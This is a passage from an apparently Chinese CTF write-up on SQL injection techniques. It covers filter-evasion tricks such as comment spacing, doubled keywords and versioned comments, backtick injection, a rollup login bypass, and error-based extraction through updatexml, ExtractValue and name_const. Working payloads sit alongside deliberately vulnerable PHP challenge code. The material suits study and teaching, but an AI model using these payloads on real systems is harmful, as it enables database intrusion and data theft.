class="line"></span><br><span class="line">content: ffifdyop</span><br><span class="line"></span><br><span class="line">md5加密为: 276f722736c95d99e921722cf9ed621c</span><br><span class="line"></span><br><span class="line">作hex转字符串: ‘or’6蒥欓!r,b</span><br></pre></td></tr></table></figure><p>注：这个问题是在PHP中存在的</p><h2 id="0x09-空格被过滤"><a href="#0x09-空格被过滤" class="headerlink" title="0x09 空格被过滤"></a>0x09 空格被过滤</h2><p>空格过滤使用<code>/*xxx*/</code>进行绕过，</p><p>有时候关键词被过滤了可以使用双写绕过</p><p>例如</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">//为三个字段，接着查库</span><br><span class="line">?id=1/*0*/order/*0*/by/*0*/3%23</span><br><span class="line"></span><br><span class="line">?id=-1/*0*/uniunionon/*0*/seselectlect/*0*/1,2,concat_ws(char(32,58,32),user(),database(),version())%23</span><br><span class="line"></span><br><span class="line">//查所有库</span><br><span class="line">?id=-1/*0*/uniunionon/*0*/seselectlect/*0*/1,2,group_concat(schema_name)/*0*/frfromom/*0*/information_schema.schemata%23</span><br><span class="line"></span><br><span class="line">//查test的表</span><br><span class="line">?id=-1/*0*/uniunionon/*0*/seselectlect/*0*/1,2,group_concat(table_name)/*0*/frfromom/*0*/information_schema.tables/*0*/where/*0*/table_schema=0x74657374%23</span><br><span class="line"></span><br><span class="line">//只有一个content,查列</span><br><span class="line">?id=-1/*0*/uniunionon/*0*/seselectlect/*0*/1,2,group_concat(column_name)/*0*/frfromom/*0*/information_schema.columns/*0*/where/*0*/table_schema=0x74657374/*0*/and/*0*/table_name=0x636f6e74656e74%23</span><br><span class="line"></span><br><span class="line">//有id,context,title。最后直接查context</span><br><span class="line">?id=-1/*0*/uniunionon/*0*/seselectlect/*0*/1,2,context/*0*/frfromom/*0*/content%23</span><br><span class="line"></span><br><span class="line">//得到flag</span><br></pre></td></tr></table></figure><h2 id="0x10-符号问题"><a href="#0x10-符号问题" class="headerlink" title="0x10 符号问题"></a>0x10 <code></code>符号问题</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span>(<span class="string">"config.php"</span>);</span><br><span class="line">$table = $_GET[<span class="string">'table'</span>]?$_GET[<span class="string">'table'</span>]:<span class="string">"test"</span>;</span><br><span class="line">$table = Filter($table);</span><br><span class="line">mysqli_query($mysqli,<span class="string">"desc `secret_&#123;$table&#125;`"</span>) <span class="keyword">or</span> Hacker();</span><br><span class="line">$sql = <span class="string">"select 'flag&#123;xxx&#125;' from secret_&#123;$table&#125;"</span>;</span><br><span class="line">$ret = sql_query($sql);</span><br><span class="line"><span class="keyword">echo</span> $ret[<span class="number">0</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>反引号是为了区分MySql的保留字段与普通字符而引入的符号</p><p>引号一般用在字段的值，如果字段值是字符或字符串，则要加引号</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [test]&gt; select `flag` from flags;</span><br><span class="line">+----------------------------------------+</span><br><span class="line">| flag                                   |</span><br><span class="line">+----------------------------------------+</span><br><span class="line">| flag&#123;37316894c36cb32d2ca3f7d3add88024&#125; |</span><br><span class="line">+----------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [test]&gt; select &apos;flag&apos; from flags;</span><br><span class="line">+------+</span><br><span class="line">| flag |</span><br><span class="line">+------+</span><br><span class="line">| flag |</span><br><span class="line">+------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>payload:构造如下形式进行注入，***位置放入关键词<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">desc `***` `***`;</span><br><span class="line"></span><br><span class="line">MariaDB [test]&gt; desc `flags` `union select table_name from information_schema.tables`;</span><br><span class="line">Empty set (0.00 sec)</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://test.com/?table=test`  `union select table_name from information_schema.tables limit 1,1</span><br><span class="line"></span><br><span class="line">http://test.com/?table=test`  `union select column_name from information_schema.columns limit 1,1</span><br><span class="line"></span><br><span class="line">http://test.com/?table=test`  `union select flagUwillNeverKnow from secret_flag limit 1,1</span><br></pre></td></tr></table></figure><h2 id="0x11-rollup-amp-amp-offset"><a href="#0x11-rollup-amp-amp-offset" class="headerlink" title="0x11 rollup&amp;&amp;offset"></a>0x11 rollup&amp;&amp;offset</h2><p><code>limit 1 offset 2</code>从第二条记录开始查询，读取1条记录（intrude fuzz 1和2这两个位置的参数）</p><p><code>rollup</code>在group by 分组之后，再合计总数，可构造使得结果为null</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_POST[<span class="string">'uname'</span>]) || !<span class="keyword">isset</span>($_POST[<span class="string">'pwd'</span>])) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;form action="" method="post"&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;input name="uname" type="text"/&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;input name="pwd" type="text"/&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;input type="submit" /&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;/form&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;!--source: source.txt--&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">    <span class="keyword">die</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">AttackFilter</span><span class="params">($StrKey,$StrValue,$ArrReq)</span></span>&#123;  </span><br><span class="line">    <span class="keyword">if</span> (is_array($StrValue))&#123;</span><br><span class="line">        $StrValue=implode($StrValue);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">"/"</span>.$ArrReq.<span class="string">"/is"</span>,$StrValue)==<span class="number">1</span>)&#123;   </span><br><span class="line">        <span class="keyword">print</span> <span class="string">"姘村彲杞借垷锛屼害鍙禌鑹囷紒"</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$filter = <span class="string">"and|select|from|where|union|join|sleep|benchmark|,|\(|\)"</span>;</span><br><span class="line"><span class="keyword">foreach</span>($_POST <span class="keyword">as</span> $key=&gt;$value)&#123; </span><br><span class="line">    AttackFilter($key,$value,$filter);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$con = mysql_connect(<span class="string">"XXXXXX"</span>,<span class="string">"XXXXXX"</span>,<span class="string">"XXXXXX"</span>);</span><br><span class="line"><span class="keyword">if</span> (!$con)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'Could not connect: '</span> . mysql_error());</span><br><span class="line">&#125;</span><br><span class="line">$db=<span class="string">"XXXXXX"</span>;</span><br><span class="line">mysql_select_db($db, $con);</span><br><span class="line"><span class="comment">#$sql="SELECT * FROM interest WHERE uname = ''  or 1=1 group by pwd with rollup limit 1 offset 2 #'";</span></span><br><span class="line">$sql=<span class="string">"SELECT * FROM interest WHERE uname = '&#123;$_POST['uname']&#125;'"</span>;</span><br><span class="line">$query = mysql_query($sql); </span><br><span class="line"><span class="keyword">if</span> (mysql_num_rows($query) == <span class="number">1</span>) &#123; </span><br><span class="line">    $key = mysql_fetch_array($query);</span><br><span class="line">    <span class="keyword">if</span>($key[<span class="string">'pwd'</span>] == $_POST[<span class="string">'pwd'</span>]) &#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"CTF&#123;XXXXXX&#125;"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"浜﹀彲璧涜墖锛�"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">print</span> <span class="string">"涓€棰楄禌鑹囷紒"</span>;</span><br><span class="line">&#125;</span><br><span class="line">mysql_close($con);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>获取flag需要满足<code>mysql_num_rows($query) == 1</code>和<code>$key[&#39;pwd&#39;] == $_POST[&#39;pwd&#39;]</code>，后者使用<code>group by pwd with rollup</code>在查询结果中加上一行，且pwd字段的值为NULL,以此绕过<code>$key[&#39;pwd&#39;] == $_POST[&#39;pwd&#39;]</code>过滤,则使用<code>limit # offset #</code>来满足<code>mysql_num_rows($query) == 1</code>,fuzz出<code>limit 1 offset 2</code></p><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; or 1=1 group by pwd with rollup limit 1 offset 2 #</span><br></pre></td></tr></table></figure><p>test</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [test]&gt; select text from article group by NULL with rollup limit 1 offset 2 ;</span><br><span class="line">Empty set (0.00 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [test]&gt; select * from article;</span><br><span class="line">+---------+-----------------------------------------------------+</span><br><span class="line">| id      | text                                                |</span><br><span class="line">+---------+-----------------------------------------------------+</span><br><span class="line">| 1       | guess what?                                         |</span><br><span class="line">| 3       | you can test it with sqli                           |</span><br><span class="line">| 2       | dudulu                                              |</span><br><span class="line">| 4       | The choice of the stone gate of all dead destinies! |</span><br><span class="line">| 5       | ??? ???                                             |</span><br><span class="line">| 8848    | you want by a phone?                                |</span><br><span class="line">| 9588    | you will be lucky                                   |</span><br><span class="line">| 1245123 | flag&#123;37316894c36cb32d2ca3f7d3add88024&#125;              |</span><br><span class="line">+---------+-----------------------------------------------------+</span><br><span class="line">8 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><h2 id="0x12-注出可控数据绕过登录"><a href="#0x12-注出可控数据绕过登录" class="headerlink" title="0x12 注出可控数据绕过登录"></a>0x12 注出可控数据绕过登录</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">welcome to simplexue</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_POST[user] &amp;&amp; $_POST[pass]) &#123;</span><br><span class="line">    $conn = mysql_connect(<span class="string">"********"</span>, <span class="string">"*****"</span>, <span class="string">"********"</span>);</span><br><span class="line">    mysql_select_db(<span class="string">"phpformysql"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Could not select database"</span>);</span><br><span class="line">    <span class="keyword">if</span> ($conn-&gt;connect_error) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Connection failed: "</span> . mysql_error($conn));</span><br><span class="line">&#125; </span><br><span class="line">$user = $_POST[user];</span><br><span class="line">$pass = md5($_POST[pass]);</span><br><span class="line"></span><br><span class="line">$sql = <span class="string">"select pw from php where user='$user'"</span>;</span><br><span class="line">$query = mysql_query($sql);</span><br><span class="line"><span class="keyword">if</span> (!$query) &#123;</span><br><span class="line">    printf(<span class="string">"Error: %s\n"</span>, mysql_error($conn));</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">$row = mysql_fetch_array($query, MYSQL_ASSOC);</span><br><span class="line"><span class="comment">//echo $row["pw"];</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (($row[pw]) &amp;&amp; (!strcasecmp($pass, $row[pw]))) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Logged in! Key:************** &lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">"&lt;p&gt;Log in failure!&lt;/p&gt;"</span>);</span><br><span class="line">    </span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;form method=post action=index.php&gt;</span><br><span class="line">&lt;input type=text name=user value=<span class="string">"Username"</span>&gt;</span><br><span class="line">&lt;input type=password name=pass value=<span class="string">"Password"</span>&gt;</span><br><span class="line">&lt;input type=submit&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;a href=<span class="string">"index.txt"</span>&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>利用user处的注入返回想要的pw</p><p>例如 <code>qwe，76d80224611fc919a5d54f0ff9fba446</code></p><p>username值<code>&#39; union select &#39;76d80224611fc919a5d54f0ff9fba446&#39;#</code></p><p>password值<code>qwe</code></p><p>提交获得flag</p><h2 id="0x13-htmlentities实体化单引号情况"><a href="#0x13-htmlentities实体化单引号情况" class="headerlink" title="0x13 htmlentities实体化单引号情况"></a>0x13 htmlentities实体化单引号情况</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#GOAL: get password from admin;</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require</span> <span class="string">'db.inc.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">clean</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(get_magic_quotes_gpc())&#123;</span><br><span class="line">        $str=stripslashes($str);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> htmlentities($str, ENT_QUOTES);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$username = @clean((string)$_GET[<span class="string">'username'</span>]);</span><br><span class="line">$password = @clean((string)$_GET[<span class="string">'password'</span>]);</span><br><span class="line"></span><br><span class="line">$query=<span class="string">'SELECT * FROM users WHERE name=\''</span>.$username.<span class="string">'\' AND pass=\''</span>.$password.<span class="string">'\';'</span>;</span><br><span class="line">$result=mysql_query($query);</span><br><span class="line"><span class="keyword">if</span>(!$result || mysql_num_rows($result) &lt; <span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Invalid password!'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$row = mysql_fetch_assoc($result);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Hello "</span>.$row[<span class="string">'name'</span>].<span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Your password is:"</span>.$row[<span class="string">'pass'</span>].<span class="string">"&lt;/br&gt;"</span>;</span><br></pre></td></tr></table></figure><p>htmlentities将单引号实体化了，所以可用\来将源单引号转义</p><p>构造<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE name=&apos;\&apos; AND pass=&apos; or 1=1 limit 2,3#&apos;;</span><br></pre></td></tr></table></figure></p><p>payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=\&amp;password=%20or%201=1%20limit%202,3%23</span><br></pre></td></tr></table></figure></p><h2 id="0x14-报错注入-amp-amp-00000select-amp-amp-‘-gt-x27"><a href="#0x14-报错注入-amp-amp-00000select-amp-amp-‘-gt-x27" class="headerlink" title="0x14 报错注入 &amp;&amp; /!00000select/ &amp;&amp; ‘-&gt;\x27"></a>0x14 报错注入 &amp;&amp; /<em>!00000select</em>/ &amp;&amp; ‘-&gt;\x27</h2><p>示例题目属于二次注入，在删除功能处进行注入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'config.php'</span>;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="keyword">array</span>(<span class="string">'_GET'</span>,<span class="string">'_POST'</span>,<span class="string">'_COOKIE'</span>) <span class="keyword">as</span> $key)&#123;</span><br><span class="line">    <span class="keyword">foreach</span>($$key <span class="keyword">as</span> $k =&gt; $v)&#123;</span><br><span class="line">        <span class="keyword">if</span>(is_array($v))&#123;</span><br><span class="line">            errorBox(<span class="string">"hello,sangebaimao!"</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $k[<span class="number">0</span>] !=<span class="string">'_'</span>?$$k = addslashes($v):$$k = <span class="string">""</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">    $rstr = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($str);$i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(ord($str[$i])&gt;<span class="number">31</span> &amp;&amp; ord($str[$i])&lt;<span class="number">127</span>)&#123;</span><br><span class="line">            $rstr = $rstr.$str[$i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $rstr = str_replace(<span class="string">'\''</span>,<span class="string">''</span>,$rstr);</span><br><span class="line">    <span class="keyword">return</span> $rstr;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($message))&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/\b(select|insert|update|delete)\b/i"</span>,$message))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"hello,sangebaimao!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(filter($message) !== $message)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"hello,sangebaimao!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $sql=<span class="string">"insert guestbook(`message`) value('$message');"</span>;</span><br><span class="line">    mysql_query($sql);</span><br><span class="line">    $sql = <span class="string">"select * from guestbook order by id limit 0,5;"</span>;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    <span class="keyword">if</span>($result)&#123;</span><br><span class="line">        <span class="keyword">while</span>($row = mysql_fetch_array($result))&#123;</span><br><span class="line">            $id = $row[<span class="string">'id'</span>];</span><br><span class="line">            $message = $row[<span class="string">'message'</span>];</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"|$id|=&gt;|$message|&lt;br/&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $message = stripcslashes($message);</span><br><span class="line">    $sql = <span class="string">"delete from guestbook where id=$id or message ='$message';"</span>;</span><br><span class="line">    <span class="keyword">if</span>(!mysql_query($sql))&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//print(mysql_error());依据这句话看出可以使用报错注入</span></span><br><span class="line">    </span><br><span class="line">        <span class="keyword">print</span>(mysql_error());</span><br><span class="line">        $sql = <span class="string">"delete from guestbook where id=$id"</span>;</span><br><span class="line">        mysql_query($sql);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>sqli关键:需要绕过单引号和preg_match</p><p>因为stripcslashes函数，可以使用<code>1\x27</code>创造单引号</p><p><code>/*!00000select*/</code>绕过preg_match</p><blockquote><p>在mysql,00000这5位代表版本号，表示只有在大于该版本的mysql中不作为注释</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [test]&gt;  /*!00000select &apos;zeroyu&apos;*/;</span><br><span class="line">+--------+</span><br><span class="line">| zeroyu |</span><br><span class="line">+--------+</span><br><span class="line">| zeroyu |</span><br><span class="line">+--------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>注： <code>concat(0x27,(/*!00000select version()*/))</code>这个对于UpdateXML和ExtractValue而言会最先执行，但是它不是一个合格xml表达式，因而或造成报错。但要注意这两个报错的最大长度是32</p><h3 id="1-利用updatexml报错"><a href="#1-利用updatexml报错" class="headerlink" title="1.利用updatexml报错"></a>1.利用updatexml报错</h3><blockquote><p>UpdateXML(xml_target, xpath_expr, new_xml)<br>updatexml函数有三个参数，作用是xml替换，把xml_target中被xpath_expr匹配到的部分使用new_xml替换</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?message=1\x27 and updatexml(0,concat(0x27,(/*!00000select version()*/)),0)%23</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [(none)]&gt; select updatexml(1,concat(0x7e,(select @@version),0x7e),1);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &apos;~10.1.36-MariaDB~&apos;</span><br></pre></td></tr></table></figure><h3 id="2-利用ExtractValue-报错"><a href="#2-利用ExtractValue-报错" class="headerlink" title="2.利用ExtractValue()报错"></a>2.利用ExtractValue()报错</h3><blockquote><p>ExtractValue(xml_frag, xpath_expr) 得到xml_frag中被xpath_expr匹配到的值</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?message=1\x27 and ExtractValue(0,concat(0x27,(/*!00000select version()*/)))%23;</span><br></pre></td></tr></table></figure><h3 id="3-name-const"><a href="#3-name-const" class="headerlink" title="3.name_const()"></a>3.name_const()</h3><blockquote><p>name_const(name,value)<br>返回给定值。 当用来产生一个结果集合列时, name_const()促使该列使用给定名称。</p></blockquote><p>本题利用的是表的字段名(列名)不允许重复，列名重复会报错，报错长度没有限制</p><p>payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?message=aaa\x27%20and%20(/*!00000SELECT*/ * FROM(/*!00000SELECT*/(name_const(version(),1)),name_const(version(),1))a)%23</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [test]&gt; select name_const(&apos;l&apos;,&apos;f&apos;);</span><br><span class="line">+------+</span><br><span class="line">| l    |</span><br><span class="line">+------+</span><br><span class="line">| f    |</span><br><span class="line">+------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//此处的a是列别名，别名使用时是可以省略as的</span><br><span class="line">MariaDB [test]&gt; /*!00000SELECT*/(name_const(version(),1)),name_const(1,version())a;</span><br><span class="line">+-----------------+-----------------+</span><br><span class="line">| 10.1.30-MariaDB | a               |</span><br><span class="line">+-----------------+-----------------+</span><br><span class="line">|               1 | 10.1.30-MariaDB |</span><br><span class="line">+-----------------+-----------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><h3 id="4-exp"><a href="#4-exp" class="headerlink" title="4.exp"></a>4.exp</h3><p>前提: 